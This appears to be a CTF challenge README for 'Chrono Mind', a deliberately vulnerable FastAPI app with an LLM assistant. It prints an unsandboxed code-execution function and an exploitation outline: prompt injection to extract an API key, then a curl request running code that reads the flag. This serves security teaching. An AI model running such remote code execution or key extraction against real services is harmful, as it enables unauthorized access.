# Chrono Mind - CTF Challenge

## 📋 Challenge Information

**Category:** Misc / Web  
**Difficulty:** Medium  
**Points:** TBD  
**Challenge Type:** AI/LLM Exploitation  

## 📝 Challenge Description

Chrono Mind is a web application that uses a language model (LaMini-Flan-T5-248M) to provide an AI assistant interface. The application offers multiple functionalities:

1. **Knowledge Repository Chat** - Query documents using an AI assistant
2. **Copilot Code Completion** - Complete and execute Python code
3. **Room-based Sessions** - Create isolated chat rooms with specific topics

The challenge involves exploiting vulnerabilities in the AI-powered features to gain unauthorized access or execute arbitrary code.

## 🎯 Solution Overview

This challenge presents multiple attack vectors:

### Potential Vulnerabilities

1. **Code Execution via Copilot Endpoint**
   - The `/api/copilot/complete_and_run` endpoint uses `evalCode()` to execute generated Python code
   - Code is executed using `subprocess.run()` with minimal sandboxing
   - Requires valid `copilot_key` (potentially discoverable or bypassable)

2. **LLM Prompt Injection**
   - The language model can be manipulated through crafted prompts
   - May leak sensitive information or bypass restrictions

3. **Session/Room Hijacking**
   - Room IDs are UUID-based but may be predictable or discoverable
   - Cookie-based authentication might be vulnerable

## 🚀 Quick Start

### Prerequisites

- Docker and Docker Compose
- Python 3.8+
- Network access to the challenge server

### Building the Challenge Locally

```bash
# Navigate to the challenge directory
cd Misc/chrono_mind

# Build and run the Docker container
./build-docker.sh

# Or manually:
docker build -t web_chrono_mind .
docker run --rm -it -p 1337:1337 --name=web_chrono_mind web_chrono_mind
```

### Accessing the Application

```
http://localhost:1337
```

## 📁 Folder Structure

```
chrono_mind/
├── README.md                    # This file
├── build-docker.sh             # Docker build script
├── Dockerfile                  # Container configuration
├── entrypoint.sh              # Container startup script
├── challenge/                 # Application source code
│   ├── main.py               # FastAPI main application
│   ├── utils.py              # Utility functions (evalCode!)
│   ├── config.py             # Configuration
│   ├── requirements.txt      # Python dependencies
│   ├── routes/
│   │   └── api.py           # API endpoints
│   ├── repository/          # Knowledge base documents
│   │   ├── communication-systems.md
│   │   ├── location-intelligence.md
│   │   └── weapon-systems.md
│   └── public/              # Frontend assets
│       ├── index.html
│       ├── chat.html
│       └── static/
├── config/                   # Docker configuration files
│   ├── supervisord.conf
│   ├── readflag.c           # SetUID flag reader
│   └── lm_dependencies.py   # Pre-download LM models
├── data/                    # Challenge data
│   ├── cookies.txt          # Session cookies (for testing)
│   └── flag.txt             # Test flag
├── docs/                    # Additional documentation
└── solution/                # Solution scripts
    └── solve.py             # (To be created)
```

## 🔧 Technical Details

### Application Architecture

**Framework:** FastAPI with Python 3.8  
**AI Model:** LaMini-Flan-T5-248M (via languagemodels library)  
**Port:** 1337  

### Key Endpoints

1. **POST /api/create** - Create a new chat room with a knowledge topic
   ```json
   {"topic": "weapon-systems"}
   ```

2. **POST /api/ask** - Ask questions to the AI assistant
   ```json
   {"prompt": "What are the weapon systems?"}
   ```
   Requires valid room cookie

3. **POST /api/copilot/complete_and_run** - Code completion and execution
   ```json
   {
     "code": "print('Hello')",
     "copilot_key": "SECRET_KEY"
   }
   ```

### Vulnerable Code Analysis

**utils.py - evalCode() function:**
```python
def evalCode(code):
    random = uuid.uuid4().hex
    filename = os.path.join("uploads/") + random + ".py"
    with open(filename, "w") as f:
        f.write(code)
    
    output = subprocess.run(
        ["python3", filename],
        timeout=10,
        capture_output=True,
        text=True,
    ).stdout.strip("\n")
    
    cleanup(filename)
    return output
```

**Vulnerability:** Arbitrary code execution if `copilot_key` is compromised.

### Flag Location

The flag is stored at `/root/flag` and can be read using the setUID binary `/readflag`:

```c
// readflag.c (compiled with setuid bit)
// Reads /root/flag and outputs to stdout
```

## 🎯 Exploitation Strategy

### Step 1: Discover the Copilot Key
- Analyze application behavior
- Check for information leakage in responses
- Use LLM prompt injection to extract configuration

### Step 2: Craft Malicious Code
```python
import subprocess
result = subprocess.run(['/readflag'], capture_output=True, text=True)
print(result.stdout)
```

### Step 3: Execute via Copilot Endpoint
```bash
curl -X POST http://target:1337/api/copilot/complete_and_run \
  -H "Content-Type: application/json" \
  -d '{
    "code": "import subprocess; print(subprocess.run(['/readflag'], capture_output=True, text=True).stdout)",
    "copilot_key": "DISCOVERED_KEY"
  }'
```

## 🐛 Troubleshooting

### Docker Build Issues
```bash
# Clean previous builds
docker rm -f web_chrono_mind
docker rmi web_chrono_mind

# Rebuild
docker build --no-cache -t web_chrono_mind .
```

### Port Already in Use
```bash
# Find and kill process using port 1337
sudo lsof -i :1337
sudo kill -9 <PID>
```

### Language Model Download Issues
The container pre-downloads the LaMini model. If issues occur:
```bash
# Check logs
docker logs web_chrono_mind

# The model is ~500MB and downloaded on first run
```

## 💡 Learning Points

1. **AI/LLM Security:** Understanding risks of code generation and execution
2. **Prompt Injection:** Manipulating language models through crafted inputs
3. **Code Sandboxing:** Importance of proper isolation for dynamic code execution
4. **API Security:** Protecting sensitive endpoints with proper authentication
5. **SetUID Binaries:** Understanding privilege escalation mechanisms

## ✅ Dependencies

```
fastapi==0.104.1
uvicorn==0.24.0
languagemodels==0.12.0
pydantic==2.5.0
```

## 📖 Additional Resources

- [FastAPI Documentation](https://fastapi.tiangolo.com/)
- [LLM Security Best Practices](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [Prompt Injection Techniques](https://learnprompting.org/docs/prompt_hacking/injection)

## 🏆 Success Criteria

- Discover the copilot API key
- Execute arbitrary Python code via the copilot endpoint
- Read the flag using `/readflag`
- Flag format: `HTB{...}`

---

**Challenge Type:** Web + AI Exploitation  
**Key Vulnerability:** Insufficient authentication and code execution in AI-assisted features  
**Difficulty:** Medium (requires understanding of LLM behavior and API security)
